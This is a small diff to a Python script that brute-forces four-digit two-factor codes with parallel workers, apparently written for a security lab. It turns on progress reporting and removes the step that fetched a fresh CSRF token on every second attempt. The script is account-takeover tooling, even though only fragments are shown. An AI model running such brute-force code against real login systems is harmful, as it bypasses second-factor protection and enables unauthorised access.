@@ -9,7 +9,7 @@ from timeDecorator import time_decorator
 # Const that enables / disables noisy prints made throughout program execution.
 DEBUG_MODE = False
 # A separate const that reports progress running attack.
-REPORT_POSITION = False
+REPORT_POSITION = True
 # Total number of possible 2fa codes, 0 -> 9999, so 10k
 TOTAL_NUM_CODES = 10000
 # Default number of worker processes to find 2fa code, if none is provided as argument to program invocation.
@@ -98,10 +98,6 @@ def try_2fa_functional_unit(process_number):
 
     # Main loop, try all 2fa codes in this worker's range.
     for code_num in range(start_range, end_range):
-        # Only grab new csrf on evens, so a csrf is used at most twice.
-        if code_num % 2 == 0:
-            csrf = get_login_page_csrf()
-
         # Use that csrf for login POST
         response_text = login(
             uname=PROVIDED_USER,
